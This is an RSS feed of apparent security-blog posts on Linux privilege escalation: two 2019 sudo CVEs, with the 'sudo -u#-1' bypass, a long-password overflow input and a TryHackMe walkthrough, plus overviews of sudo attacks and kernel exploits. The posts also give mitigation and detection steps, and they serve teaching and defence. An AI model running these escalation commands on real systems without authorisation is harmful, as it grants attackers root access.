<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Kernel on Zerodex Blog</title><link>https://zerodex1.github.io/tags/kernel/</link><description>Recent content in Kernel on Zerodex Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 23 Jan 2025 14:14:48 +0000</lastBuildDate><atom:link href="https://zerodex1.github.io/tags/kernel/index.xml" rel="self" type="application/rss+xml"/><item><title>Sudo CVEs</title><link>https://zerodex1.github.io/p/sudo-cves/</link><pubDate>Thu, 23 Jan 2025 14:14:48 +0000</pubDate><guid>https://zerodex1.github.io/p/sudo-cves/</guid><description>&lt;img src="https://zerodex1.github.io/post/cvesudo.jpg" alt="Featured image of post Sudo CVEs" />&lt;h1 id="sudo-cves">Sudo CVEs
&lt;/h1>&lt;p>In this article, we will discuss sudo CVEs, specifically &lt;code>CVE-2019-14287&lt;/code> and &lt;code>CVE-2019-18634&lt;/code>, and how they allow us to achieve sudo privilege escalation on Linux systems.&lt;/p>
&lt;h2 id="cve-2019-14287">&lt;strong>CVE-2019-14287&lt;/strong>
&lt;/h2>&lt;p>CVE-2019-14287 is a vulnerability in &lt;code>sudo&lt;/code> that allows a user with restricted privileges to execute arbitrary commands as &lt;strong>root&lt;/strong>, even if they are explicitly denied in the &lt;code>sudoers&lt;/code> file. This occurs due to improper validation of the user ID (&lt;code>UID&lt;/code>) when running commands.&lt;/p>
&lt;hr>
&lt;h2 id="details-of-the-vulnerability">&lt;strong>Details of the Vulnerability&lt;/strong>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>&lt;strong>Affected Software&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>&lt;code>sudo&lt;/code> versions prior to &lt;strong>1.8.28&lt;/strong>.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Vulnerability Description&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>When &lt;code>sudo&lt;/code> is configured to allow a user to execute commands as any user &lt;strong>except root&lt;/strong> using the &lt;code>!ALL&lt;/code> directive in the &lt;code>sudoers&lt;/code> file, the vulnerability allows bypassing this restriction.&lt;/li>
&lt;li>The issue arises because &lt;code>sudo&lt;/code> does not properly handle the &lt;code>-1&lt;/code> or &lt;code>4294967295&lt;/code> value for the &lt;code>UID&lt;/code>. Internally, these values are interpreted as &lt;code>0&lt;/code> (root).&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Exploitation&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>A user can exploit this by specifying &lt;code>-u#-1&lt;/code> to execute a command as root, bypassing the restrictions.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="proof-of-concept-poc">&lt;strong>Proof of Concept (PoC)&lt;/strong>
&lt;/h2>&lt;h3 id="1-vulnerable-configuration-in-etcsudoers">1. Vulnerable Configuration in &lt;code>/etc/sudoers&lt;/code>:
&lt;/h3>&lt;p>The following configuration denies a user (&lt;code>exampleuser&lt;/code>) from executing commands as root:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">exampleuser ALL=(ALL,!root) ALL
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="2-exploit-command">2. Exploit Command:
&lt;/h3>&lt;p>The attacker can bypass the restriction and run commands as root:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo -u#-1 id
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="3-expected-output">3. Expected Output:
&lt;/h3>&lt;p>The command will execute as root (&lt;code>UID=0&lt;/code>):&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">uid=0(root) gid=0(root) groups=0(root)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;hr>
&lt;h2 id="impact">&lt;strong>Impact&lt;/strong>
&lt;/h2>&lt;ul>
&lt;li>&lt;strong>Privilege Escalation&lt;/strong>: The attacker gains root privileges, bypassing intended restrictions.&lt;/li>
&lt;li>&lt;strong>Severity&lt;/strong>: High (CVSS Score: 7.8).&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="mitigation">&lt;strong>Mitigation&lt;/strong>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>&lt;strong>Update &lt;code>sudo&lt;/code>&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>Upgrade to &lt;strong>sudo 1.8.28&lt;/strong> or later, which properly validates &lt;code>UID&lt;/code> values.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt update &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> sudo apt install sudo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>Audit and Restrict sudoers Configuration&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>Ensure your &lt;code>sudoers&lt;/code> file does not rely solely on &lt;code>!root&lt;/code> for user restrictions.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Monitor and Log sudo Usage&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>Use logs to monitor unusual activity involving &lt;code>sudo&lt;/code>.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="labs-">Labs :
&lt;/h2>&lt;ul>
&lt;li>&lt;a class="link" href="https://tryhackme.com/r/room/sudovulnsbypass" target="_blank" rel="noopener"
>https://tryhackme.com/r/room/sudovulnsbypass&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="tryhackme-lab">TryHackMe Lab
&lt;/h3>&lt;p>Now that we have access to the machine, our next goal is to gain root privileges using the identified vulnerability.&lt;/p>
&lt;p>First, we use the command &lt;code>sudo -l&lt;/code> to check what commands we can execute with the current user.&lt;/p>
&lt;p>&lt;img src="https://zerodex1.github.io/post/cves1.png"
loading="lazy"
alt="image alt text"
>&lt;/p>
&lt;p>After running &lt;code>sudo -l&lt;/code>, we see that we can run &lt;code>/bin/bash&lt;/code> as another user except for root. Letâ€™s exploit this vulnerability.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo -u#-1 /bin/bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://zerodex1.github.io/post/cvs2.png"
loading="lazy"
alt="image alt text"
>&lt;/p>
&lt;p>And just like that, we are now the root user! :&lt;/p>
&lt;h3 id="references">&lt;strong>References&lt;/strong>
&lt;/h3>&lt;ul>
&lt;li>&lt;a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287" target="_blank" rel="noopener"
>MITRE CVE Details&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="cve-2019-18634">&lt;strong>CVE-2019-18634&lt;/strong>
&lt;/h2>&lt;p>CVE-2019-18634 is a &lt;strong>buffer overflow vulnerability&lt;/strong> in &lt;code>sudo&lt;/code> that can allow local privilege escalation. It specifically affects &lt;code>sudo&lt;/code> configurations where &lt;strong>pwfeedback&lt;/strong> is enabled, which can result in memory corruption and potentially lead to unauthorized code execution or system crashes.&lt;/p>
&lt;hr>
&lt;h2 id="details-of-the-vulnerability-1">&lt;strong>Details of the Vulnerability&lt;/strong>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>&lt;strong>Affected Software&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>&lt;code>sudo&lt;/code> versions prior to &lt;strong>1.8.31&lt;/strong>.&lt;/li>
&lt;li>Only configurations with &lt;strong>pwfeedback&lt;/strong> enabled are affected.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Vulnerability Description&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>The &lt;strong>pwfeedback&lt;/strong> option, which provides visual feedback when typing a password (e.g., asterisks), is susceptible to a buffer overflow.&lt;/li>
&lt;li>If the input exceeds the buffer size, it overflows, corrupting memory.&lt;/li>
&lt;li>The issue is exploitable only when the attacker provides their own password input, making it a local attack vector.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Exploitation&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>By triggering the buffer overflow, an attacker can potentially execute arbitrary code or crash the &lt;code>sudo&lt;/code> process.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="proof-of-concept-poc-1">&lt;strong>Proof of Concept (PoC)&lt;/strong>
&lt;/h2>&lt;h3 id="1-vulnerable-configuration">1. Vulnerable Configuration:
&lt;/h3>&lt;p>The &lt;code>/etc/sudoers&lt;/code> file must have &lt;strong>pwfeedback&lt;/strong> enabled:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">Defaults pwfeedback
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="2-exploit-steps">2. Exploit Steps:
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>Use a specially crafted input (e.g., very long password) to overflow the buffer.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>For example:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 -c &lt;span class="s2">&amp;#34;print(&amp;#39;A&amp;#39; * 10000)&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> sudo -S id
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>This may result in a segmentation fault or allow further exploitation.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="3-output">3. Output:
&lt;/h3>&lt;p>If the system is vulnerable, it could crash with a segmentation fault:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">Segmentation fault (core dumped)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;hr>
&lt;h2 id="impact-1">&lt;strong>Impact&lt;/strong>
&lt;/h2>&lt;ul>
&lt;li>&lt;strong>Privilege Escalation&lt;/strong>: Potential execution of arbitrary code with root privileges.&lt;/li>
&lt;li>&lt;strong>Denial of Service&lt;/strong>: Crash or instability of the &lt;code>sudo&lt;/code> process.&lt;/li>
&lt;li>&lt;strong>Severity&lt;/strong>: High (CVSS Score: 7.8).&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="mitigation-1">&lt;strong>Mitigation&lt;/strong>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>&lt;strong>Update &lt;code>sudo&lt;/code>&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Upgrade to &lt;code>sudo&lt;/code> version &lt;strong>1.8.31&lt;/strong> or later, where the issue is patched:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt update &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> sudo apt install sudo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Disable pwfeedback&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Ensure the &lt;code>pwfeedback&lt;/code> option is not enabled in &lt;code>/etc/sudoers&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">Defaults !pwfeedback
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Apply Principle of Least Privilege&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>Limit sudo access to necessary users and monitor suspicious activity.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="detection">&lt;strong>Detection&lt;/strong>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>&lt;strong>Check sudo Version&lt;/strong>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo --version
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>Search for pwfeedback in sudoers&lt;/strong>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo grep pwfeedback /etc/sudoers /etc/sudoers.d/*
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="labs--1">Labs :
&lt;/h2>&lt;ul>
&lt;li>&lt;a class="link" href="https://tryhackme.com/r/room/sudovulnsbof" target="_blank" rel="noopener"
>https://tryhackme.com/r/room/sudovulnsbof&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="references-1">&lt;strong>References&lt;/strong>
&lt;/h2>&lt;ul>
&lt;li>&lt;a class="link" href="https://www.sudo.ws/alerts/pwfeedback.html" target="_blank" rel="noopener"
>Sudo Security Advisory&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18634" target="_blank" rel="noopener"
>MITRE CVE Details&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Sudo Attacks</title><link>https://zerodex1.github.io/p/sudo-attacks/</link><pubDate>Thu, 23 Jan 2025 13:48:02 +0000</pubDate><guid>https://zerodex1.github.io/p/sudo-attacks/</guid><description>&lt;img src="https://zerodex1.github.io/post/sudo.jpg" alt="Featured image of post Sudo Attacks" />&lt;h1 id="introduction-to-sudo-attacks-and-privilege-escalation-on-linux">Introduction to Sudo Attacks and Privilege Escalation on Linux
&lt;/h1>&lt;p>In the world of Linux-based operating systems, the &lt;code>sudo&lt;/code> command plays a critical role in user privilege management. It allows permitted users to execute commands as the superuser (root) or another user, as specified by the security policy. However, various vulnerabilities have been discovered in &lt;code>sudo&lt;/code> that can lead to privilege escalation, allowing unauthorized users to gain elevated access to system resources.&lt;/p>
&lt;p>This discussion centers around several notable vulnerabilities, including CVE-2019-14287 and CVE-2019-18634, which have garnered attention for their potential to exploit the &lt;code>sudo&lt;/code> command for malicious purposes. These vulnerabilities demonstrate the importance of understanding how &lt;code>sudo&lt;/code> can be misconfigured or manipulated, leading to security breaches.&lt;/p>
&lt;h2 id="topics-to-discuss">Topics to Discuss
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>&lt;strong>CVE-2019-14287&lt;/strong>: CVE-2019-14287 is a vulnerability in &lt;code>sudo&lt;/code> that allows a user with restricted privileges to execute arbitrary commands as &lt;strong>root&lt;/strong>, even if they are explicitly denied in the &lt;code>sudoers&lt;/code> file. This occurs due to improper validation of the user ID (&lt;code>UID&lt;/code>) when running commands.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>CVE-2019-18634&lt;/strong>: CVE-2019-18634 is a &lt;strong>buffer overflow vulnerability&lt;/strong> in &lt;code>sudo&lt;/code> that can allow local privilege escalation. It specifically affects &lt;code>sudo&lt;/code> configurations where &lt;strong>pwfeedback&lt;/strong> is enabled, which can result in memory corruption and potentially lead to unauthorized code execution or system crashes.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Shell Escaping&lt;/strong>: This topic focuses on the concept of shell escaping in command execution, particularly when arguments passed to the shell are not properly sanitized. Attackers can craft malicious input to manipulate shell behavior, leading to unintentional command executions with elevated privileges.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>LD_PRELOAD&lt;/strong>: This is an environment variable that can be exploited to execute malicious shared libraries before any other libraries when running a program. By using &lt;code>LD_PRELOAD&lt;/code>, attackers can intercept and modify calls to system functions within programs invoked with &lt;code>sudo&lt;/code>, paving the way for privilege escalation.&lt;/p>
&lt;/li>
&lt;/ol></description></item><item><title>Linux Kernel Exploit Privesc</title><link>https://zerodex1.github.io/p/linux-kernel-exploit-privesc/</link><pubDate>Wed, 22 Jan 2025 12:43:56 +0000</pubDate><guid>https://zerodex1.github.io/p/linux-kernel-exploit-privesc/</guid><description>&lt;img src="https://zerodex1.github.io/post/bestcoverblog.jpg" alt="Featured image of post Linux Kernel Exploit Privesc" />&lt;h1 id="whats-a-kernel-exploit">What&amp;rsquo;s a Kernel Exploit?
&lt;/h1>&lt;p>A &lt;strong>kernel exploit&lt;/strong> refers to a technique used to exploit vulnerabilities within the kernel, the core component of an operating system. By leveraging these vulnerabilities, attackers can gain unauthorized access or elevate their privileges on the system. The ultimate goal of a kernel exploit is to execute arbitrary code within the kernel&amp;rsquo;s privileged context, often leading to root access and full control over the compromised machine.&lt;/p>
&lt;h3 id="conditions-for-a-successful-kernel-exploit">Conditions for a Successful Kernel Exploit
&lt;/h3>&lt;p>For a kernel exploit attack to be successful, an attacker must meet four critical conditions:&lt;/p>
&lt;ol>
&lt;li>&lt;strong>A Vulnerable Kernel&lt;/strong>: The target system must be running a kernel version that contains a known vulnerability.&lt;/li>
&lt;li>&lt;strong>A Matching Exploit&lt;/strong>: There must be an existing exploit tailored for that specific vulnerability.&lt;/li>
&lt;li>&lt;strong>Ability to Transfer the Exploit&lt;/strong>: The attacker needs the means to transfer the exploit code to the target system.&lt;/li>
&lt;li>&lt;strong>Ability to Execute the Exploit&lt;/strong>: The attacker must have the capability to run the exploit on the target successfully.&lt;/li>
&lt;/ol>
&lt;h2 id="identifying-vulnerable-kernels">Identifying Vulnerable Kernels
&lt;/h2>&lt;p>To determine if a target kernel is vulnerable, you need to conduct some enumeration. Use the following command:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl"> uname -a
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> uname -r
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>TheÂ &lt;code>uname -a&lt;/code>Â command provides complete system information, whileÂ &lt;code>uname -r&lt;/code>Â displays the kernel version specifically.&lt;/li>
&lt;li>Once you have this information, check online to see if the revealed kernel version contains any known vulnerabilities that could be exploited for privilege escalation.&lt;/li>
&lt;/ul>
&lt;h3 id="resources-for-finding-kernel-exploits">Resources for Finding Kernel Exploits
&lt;/h3>&lt;p>Here are some valuable resources to help you identify kernel exploits:&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://github.com/lucyoa/kernel-exploits" title="null"
target="_blank" rel="noopener"
>Kernel Exploits Repository on GitHub&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.exploit-db.com/" title="null"
target="_blank" rel="noopener"
>Exploit Database&lt;/a>&lt;/li>
&lt;li>TheÂ &lt;code>searchsploit&lt;/code>Â tool from Kali Linux can also be incredibly useful for searching exploits.&lt;/li>
&lt;/ul>
&lt;h3 id="modifying-exploits">Modifying Exploits
&lt;/h3>&lt;p>If you discover that an exploit doesnâ€™t work despite the correct kernel version, consider either switching to a different exploit or modifying the exploit code to better suit the target environment. Exploits often require tailoring to match specific configurations or system defenses.&lt;/p>
&lt;h2 id="practical-labs-for-learning">Practical Labs for Learning
&lt;/h2>&lt;p>If you&amp;rsquo;re looking to practice kernel exploitation techniques, consider engaging with the following labs:&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://www.vulnhub.com/entry/stapler-1,150/" title="null"
target="_blank" rel="noopener"
>Stapler on VulnHub&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://tryhackme.com/r/room/linprivesc?utm_source=admin" title="null"
target="_blank" rel="noopener"
>Linux Privilege Escalation Room on TryHackMe&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>These platforms provide a safe and controlled environment to hone your skills in identifying and exploiting kernel vulnerabilities.&lt;/p>
&lt;h3 id="conclusion">Conclusion
&lt;/h3>&lt;p>Kernel exploits are powerful tools for attackers, and understanding how they function is crucial for both offensive and defensive cybersecurity practices. By familiarizing yourself with the conditions for exploitation and utilizing available resources and labs, you can enhance your knowledge and skills in this critical area of cybersecurity.&lt;/p></description></item></channel></rss>